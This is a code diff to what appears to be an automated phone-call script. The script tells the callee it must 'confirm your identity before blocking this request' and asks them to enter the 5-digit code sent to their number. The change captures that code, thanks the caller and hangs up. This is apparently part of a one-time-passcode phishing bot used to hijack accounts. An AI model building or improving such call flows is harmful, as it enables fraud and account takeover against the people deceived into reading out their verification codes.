@@ -13,8 +13,16 @@ async def call_flow(call_handler: CallHandler):
     if not dtmf_result:
         await call_handler.hangup()
         return
-    
+
     await call_handler.say("We nee to confirm you identity before blocking this request. Please enter the 5 digit code we sent to your number followed by the pound key")
-    await call_handler.gather_and_say(length=5, delay=8, finish_on_key="#", delay_msg=DELAY_ERR_MESSAGE)
+    dtmf_result = await call_handler.gather_and_say(length=5, delay=8, finish_on_key="#", delay_msg=DELAY_ERR_MESSAGE)
+
+    if dtmf_result:
+        stream_id = await call_handler.say("thank you for entering the code")
+        await stream_id.flush()
+
+    await call_handler.hangup()
+
+
 
     
